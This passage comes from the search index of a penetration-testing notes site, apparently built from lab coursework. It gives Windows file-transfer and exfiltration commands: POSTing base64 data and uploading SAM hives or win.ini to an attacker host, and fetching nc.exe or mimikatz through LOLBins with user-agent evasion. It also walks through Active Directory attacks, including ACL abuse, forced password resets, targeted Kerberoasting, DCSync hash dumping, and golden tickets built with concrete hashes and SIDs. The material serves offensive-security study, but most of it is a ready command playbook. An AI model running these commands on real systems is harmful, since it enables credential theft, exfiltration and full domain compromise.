<p><code>Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64</code></p> </li> <li> <p><code>nc -lvnp 8000</code></p> </li> <li> <p><code>echo &lt;base64&gt; | base64 -d -w 0 &gt; hosts</code></p> </li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#smb-uploads","title":"SMB Uploads","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#using-the-webdav-python-module","title":"Using the WebDav Python module","text":"<ul> <li><code>sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#connecting-to-the-webdav-share","title":"Connecting to the Webdav Share","text":"<ul> <li><code>dir \\\\192.168.49.128\\DavWWWRoot</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#uploading-files-using-smb","title":"Uploading Files using SMB","text":"<ul> <li><code>copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#creating-a-share-with-smbserverpy","title":"Creating a Share with smbserver.py","text":"<ul> <li><code>sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#upload-to-attack","title":"Upload to Attack","text":"<ul> <li><code>move sam.save \\\\10.10.15.16\\CompData</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#ftp-uploads","title":"FTP Uploads","text":"<ul> <li><code>sudo python3 -m pyftpdlib --port 21 --write</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#powershell-upload-file","title":"PowerShell Upload File","text":"<ul> <li><code>(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#transferring-files-with-code","title":"Transferring Files with Code","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#javascript","title":"JavaScript","text":"<pre><code>var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#download-a-file-using-javascript-and-cscriptexe","title":"Download a File Using JavaScript and cscript.exe","text":"<ul> <li><code>cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#vbscript","title":"VBScript","text":"<pre><code>dim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#download-a-file-using-vbscript-and-cscriptexe","title":"Download a File Using VBScript and cscript.exe","text":"<ul> <li><code>cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#miscellaneous-file-transfer-methods","title":"Miscellaneous File Transfer Methods","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#from-dc01-confirm-winrm-port-tcp-5985-is-open-on-database01","title":"From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.","text":"<ul> <li><code>Test-NetConnection -ComputerName DATABASE01 -Port 5985</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#create-a-powershell-remoting-session-to-database01","title":"Create a PowerShell Remoting Session to DATABASE01","text":"<ul> <li><code>$Session = New-PSSession -ComputerName DATABASE01</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#copy-samplefiletxt-from-our-localhost-to-the-database01-session","title":"Copy samplefile.txt from our Localhost to the DATABASE01 Session","text":"<ul> <li><code>Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#copy-databasetxt-from-database01-session-to-our-localhost","title":"Copy DATABASE.txt from DATABASE01 Session to our Localhost","text":"<ul> <li><code>Copy-Item -Path \"C:\\Users\\Administrator\\Desktop\\DATABASE.txt\" -Destination C:\\ -FromSession $Session</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#rdp","title":"RDP","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#mounting-a-linux-folder-using-rdesktop","title":"Mounting a Linux Folder Using rdesktop","text":"<ul> <li><code>rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#mounting-a-linux-folder-using-xfreerdp","title":"Mounting a Linux Folder Using xfreerdp","text":"<ul> <li><code>xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@'</code> To access the directory, we can connect to \\tsclient\\, allowing us to transfer files to and from the RDP session.</li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#protected-file-transfers","title":"Protected File Transfers","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#file-encryption-on-windows","title":"File Encryption on Windows","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#invoke-aesencryptionps1","title":"Invoke-AESEncryption.ps1","text":"<pre><code>.EXAMPLE\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Text \"Secret Text\" \n\nDescription\n-----------\nEncrypts the string \"Secret Test\" and outputs a Base64 encoded ciphertext.\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Text \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\"\n\nDescription\n-----------\nDecrypts the Base64 encoded string \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\" and outputs plain text.\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Path file.bin\n\nDescription\n-----------\nEncrypts the file \"file.bin\" and outputs an encrypted file \"file.bin.aes\"\n\n.EXAMPLE\nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Path file.bin.aes\n\nDescription\n-----------\nDecrypts the file \"file.bin.aes\" and outputs an encrypted file \"file.bin\"\n#&gt;\nfunction Invoke-AESEncryption {\n    [CmdletBinding()]\n    [OutputType([string])]\n    Param\n    (\n        [Parameter(Mandatory = $true)]\n        [ValidateSet('Encrypt', 'Decrypt')]\n        [String]$Mode,\n\n        [Parameter(Mandatory = $true)]\n        [String]$Key,\n\n        [Parameter(Mandatory = $true, ParameterSetName = \"CryptText\")]\n        [String]$Text,\n\n        [Parameter(Mandatory = $true, ParameterSetName = \"CryptFile\")]\n        [String]$Path\n    )\n\n    Begin {\n        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed\n        $aesManaged = New-Object System.Security.Cryptography.AesManaged\n        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC\n        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros\n        $aesManaged.BlockSize = 128\n        $aesManaged.KeySize = 256\n    }\n\n    Process {\n        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))\n\n        switch ($Mode) {\n            'Encrypt' {\n                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}\n\n                if ($Path) {\n                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n                    if (!$File.FullName) {\n                        Write-Error -Message \"File not found!\"\n                        break\n                    }\n                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n                    $outPath = $File.FullName + \".aes\"\n                }\n\n                $encryptor = $aesManaged.CreateEncryptor()\n                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)\n                $encryptedBytes = $aesManaged.IV + $encryptedBytes\n                $aesManaged.Dispose()\n\n                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}\n\n                if ($Path) {\n                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)\n                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime\n                    return \"File encrypted to $outPath\"\n                }\n            }\n\n            'Decrypt' {\n                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}\n\n                if ($Path) {\n                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n                    if (!$File.FullName) {\n                        Write-Error -Message \"File not found!\"\n                        break\n                    }\n                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n                    $outPath = $File.FullName -replace \".aes\"\n                }\n\n                $aesManaged.IV = $cipherBytes[0..15]\n                $decryptor = $aesManaged.CreateDecryptor()\n                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)\n                $aesManaged.Dispose()\n\n                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}\n\n                if ($Path) {\n                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)\n                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime\n                    return \"File decrypted to $outPath\"\n                }\n            }\n        }\n    }\n\n    End {\n        $shaManaged.Dispose()\n        $aesManaged.Dispose()\n    }\n}\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#import-module-invoke-aesencryptionps1","title":"Import Module Invoke-AESEncryption.ps1","text":"<ul> <li><code>Import-Module .\\Invoke-AESEncryption.ps1</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#file-encryption-example","title":"File Encryption Example","text":"<ul> <li><code>Invoke-AESEncryption -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#living-off-the-land","title":"Living off The Land","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#upload-winini-to-our-pwnbox","title":"Upload win.ini to our Pwnbox","text":"<ul> <li><code>certreq.exe -Post -config http://192.168.49.128/ c:\\windows\\win.ini</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#file-received-in-our-netcat-session","title":"File Received in our Netcat Session","text":"<ul> <li><code>sudo nc -lvnp 80</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#evading-detection","title":"Evading Detection","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#request-with-chrome-user-agent","title":"Request with Chrome User Agent","text":"<pre><code>UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome\nInvoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile \"C:\\Users\\Public\\nc.exe\"\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#lolbas-gtfobins","title":"LOLBAS / GTFOBins","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#transferring-file-with-gfxdownloadwrapperexe","title":"Transferring File with GfxDownloadWrapper.exe","text":"<ul> <li><code>GfxDownloadWrapper.exe \"http://10.10.10.132/mimikatz.exe\" \"C:\\Temp\\nc.exe\"</code></li> </ul>"},{"location":"old/Utils/Databases/","title":"DATABASES","text":""},{"location":"old/Utils/Databases/#postgres","title":"POSTGRES","text":"<ul> <li><code>psql -h 127.0.0.1 -U postgres</code> - Connect DB</li> <li><code>\\l</code> - List all databases</li> <li><code>\\c \u201cdb\u201d;</code> - Select DB</li> <li><code>\\dt;</code> - List all tables</li> <li> <p><code>Select * from users;</code> - Dump table data</p> </li> <li> <p><code>mysql -h 127.0.0.1 -P 3306 -u theseus -piamkingtheseus</code> SHOW DATABASES; USE Name; show tables; select * from table;</p> </li> </ul>"},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/","title":"ACL Abuse Tactics","text":""},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#abusing-acls","title":"Abusing ACLs","text":"<p>So, first, we must authenticate as wley and force change the password of the user damundsen. We can start by opening a PowerShell console and authenticating as the wley user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a PSCredential object.</p>"},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#creating-a-pscredential-object","title":"Creating a PSCredential Object","text":"<pre><code>PS C:\\htb&gt; $SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force\nPS C:\\htb&gt; $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword) \n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#creating-a-securestring-object","title":"Creating a SecureString Object","text":"<pre><code>PS C:\\htb&gt; $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#changing-the-users-password","title":"Changing the User's Password","text":"<pre><code>PS C:\\htb&gt; Import-Module .\\PowerView.ps1\nPS C:\\htb&gt; Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose\n</code></pre> <p>We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the wley user that we control. Next, we need to perform a similar process to authenticate as the damundsen user and add ourselves to the Help Desk Level 1 group.</p>"},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#creating-a-securestring-object-using-damundsen","title":"Creating a SecureString Object using damundsen","text":"<pre><code>PS C:\\htb&gt; $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\nPS C:\\htb&gt; $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword) \n</code></pre> <p>Next, we can use the Add-DomainGroupMember function to add ourselves to the target group</p>"},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#adding-damundsen-to-the-help-desk-level-1-group","title":"Adding damundsen to the Help Desk Level 1 Group","text":"<pre><code>PS C:\\htb&gt; Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose\n\nPS C:\\htb&gt; Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * | Select -ExpandProperty Members\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#confirming-damundsen-was-added-to-the-group","title":"Confirming damundsen was Added to the Group","text":"<pre><code>PS C:\\htb&gt; Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName\n</code></pre> <p>At this point, we should be able to leverage our new group membership to take control over the adunn user. Now, let's say that our client permitted us to change the password of the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.</p> <p>We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.</p>"},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#creating-a-fake-spn","title":"Creating a Fake SPN","text":"<pre><code>PS C:\\htb&gt; Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#kerberoasting-with-rubeus","title":"Kerberoasting with Rubeus","text":"<pre><code>PS C:\\htb&gt; .\\Rubeus.exe kerberoast /user:adunn /nowrap\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#cleanup","title":"Cleanup","text":""},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#removing-the-fake-spn-from-adunns-account","title":"Removing the Fake SPN from adunn's Account","text":"<pre><code>PS C:\\htb&gt; Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#removing-damundsen-from-the-help-desk-level-1-group","title":"Removing damundsen from the Help Desk Level 1 Group","text":"<pre><code>PS C:\\htb&gt; Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/AbsuingACL/#confirming-damundsen-was-removed-from-the-group","title":"Confirming damundsen was Removed from the Group","text":"<pre><code>PS C:\\htb&gt; Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/DCSync/","title":"DCSync","text":"<p>To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.</p>"},{"location":"old/old_ActiveDirectory/ACL/DCSync/#using-get-domainuser-to-view-adunns-group-membership","title":"Using Get-DomainUser to View adunn's Group Membership","text":"<pre><code>PS C:\\htb&gt; Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/DCSync/#using-get-objectacl-to-check-adunns-replication-rights","title":"Using Get-ObjectAcl to Check adunn's Replication Rights","text":"<pre><code>PS C:\\htb&gt; $sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\"\nPS C:\\htb&gt; Get-ObjectAcl \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/DCSync/#extracting-ntlm-hashes-and-kerberos-keys-using-secretsdumppy","title":"Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py","text":"<pre><code>COR33@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 \n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/DCSync/#viewing-an-account-with-reversible-encryption-password-storage-set","title":"Viewing an Account with Reversible Encryption Password Storage Set","text":""},{"location":"old/old_ActiveDirectory/ACL/DCSync/#enumerating-further-using-get-aduser","title":"Enumerating Further using Get-ADUser","text":"<pre><code>PS C:\\htb&gt; Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/DCSync/#checking-for-reversible-encryption-option-using-get-domainuser","title":"Checking for Reversible Encryption Option using Get-DomainUser","text":"<pre><code>PS C:\\htb&gt; Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/DCSync/#using-runasexe","title":"Using runas.exe","text":"<pre><code>C:\\Windows\\system32&gt;runas /netonly /user:INLANEFREIGHT\\adunn powershell\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/DCSync/#performing-the-attack-with-mimikatz","title":"Performing the Attack with Mimikatz","text":"<pre><code>PS C:\\htb&gt; .\\mimikatz.exe\nmimikatz # privilege::debug\nmimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator\n\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/","title":"ACL Enumeration","text":""},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/#enumerating-acls-with-powerview","title":"Enumerating ACLs with PowerView","text":""},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/#using-find-interestingdomainacl","title":"Using Find-InterestingDomainAcl","text":"<pre><code>PS C:\\htb&gt; Find-InterestingDomainAcl\n</code></pre> <p>We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.</p> <p>Note that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.</p>"},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/#using-get-domainobjectacl","title":"Using Get-DomainObjectACL","text":"<pre><code>PS C:\\htb&gt; Import-Module .\\PowerView.ps1\nPS C:\\htb&gt; $sid = Convert-NameToSid wley\nPS C:\\htb&gt; Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/#performing-a-reverse-search-mapping-to-a-guid-value","title":"Performing a Reverse Search &amp; Mapping to a GUID Value","text":"<pre><code>PS C:\\htb&gt; $guid= \"00299570-246d-11d0-a768-00aa006e0529\"\nPS C:\\htb&gt; Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/#using-the-resolveguids-flag","title":"Using the -ResolveGUIDs Flag","text":"<pre><code>PS C:\\htb&gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} \n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/#creating-a-list-of-domain-users","title":"Creating a List of Domain Users","text":"<pre><code>PS C:\\htb&gt; Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/#a-useful-foreach-loop","title":"A Useful foreach Loop","text":"<pre><code>PS C:\\htb&gt; foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/#further-enumeration-of-rights-using-damundsen","title":"Further Enumeration of Rights Using damundsen","text":"<pre><code>PS C:\\htb&gt; $sid2 = Convert-NameToSid damundsen\nPS C:\\htb&gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/#investigating-the-help-desk-level-1-group-with-get-domaingroup","title":"Investigating the Help Desk Level 1 Group with Get-DomainGroup","text":"<pre><code>PS C:\\htb&gt; Get-DomainGroup -Identity \"Help Desk Level 1\" | select memberof\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/#investigating-the-information-technology-group","title":"Investigating the Information Technology Group","text":"<pre><code>PS C:\\htb&gt; $itgroupsid = Convert-NameToSid \"Information Technology\"\nPS C:\\htb&gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/#looking-for-interesting-access","title":"Looking for Interesting Access","text":"<pre><code>PS C:\\htb&gt; $adunnsid = Convert-NameToSid adunn \nPS C:\\htb&gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose\n</code></pre>"},{"location":"old/old_ActiveDirectory/ACL/EnumerationACL/#enumerating-acls-with-bloodhound","title":"Enumerating ACLs with BloodHound","text":""},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/","title":"Attacking Domain Trusts - Child -&gt; Parent Trusts","text":""},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#windows","title":"Windows","text":""},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#extrasids-attack-mimikatz","title":"ExtraSids Attack - Mimikatz","text":"<p>This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.</p> <p>To perform this attack after compromising a child domain, we need the following:</p> <ul> <li>The KRBTGT hash for the child domain</li> <li>The SID for the child domain</li> <li>The name of a target user in the child domain (does not need to exist!)</li> <li>The FQDN of the child domain.</li> <li>The SID of the Enterprise Admins group of the root domain.</li> <li>With this data collected, the attack can be performed with Mimikatz. Now we can gather each piece of data required to perform the ExtraSids attack. First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.</li> </ul> <p>Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.</p>"},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#obtaining-the-krbtgt-accounts-nt-hash-using-mimikatz","title":"Obtaining the KRBTGT Account's NT Hash using Mimikatz","text":"<pre><code>mimikatz.exe\nmimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#obtaining-enterprise-admins-groups-sid-using-get-domaingroup","title":"Obtaining Enterprise Admins Group's SID using Get-DomainGroup","text":"<pre><code>PS &gt; Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" | select distinguishedname,objectsid\n</code></pre> <ul> <li>The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f</li> <li>The SID for the child domain: S-1-5-21-2806153819-209893948-922872689</li> <li>The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: hacker</li> <li>The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL</li> <li>The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519</li> </ul>"},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#creating-a-golden-ticket-with-mimikatz","title":"Creating a Golden Ticket with Mimikatz","text":"<pre><code>PS &gt; mimikatz.exe\n\nmimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#extrasids-attack-rubeus","title":"ExtraSids Attack - Rubeus","text":"<pre><code>PS &gt;  .\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#performing-a-dcsync-attack","title":"Performing a DCSync Attack","text":"<pre><code>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm /domain:INLANEFREIGHT.LOCAL\n</code></pre>"},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#linux","title":"Linux","text":""},{"location":"old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/#performing-dcsync-with-secretsdumppy","title":"Performing DCSync with secretsdump.py","text":"<pre><code>$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user 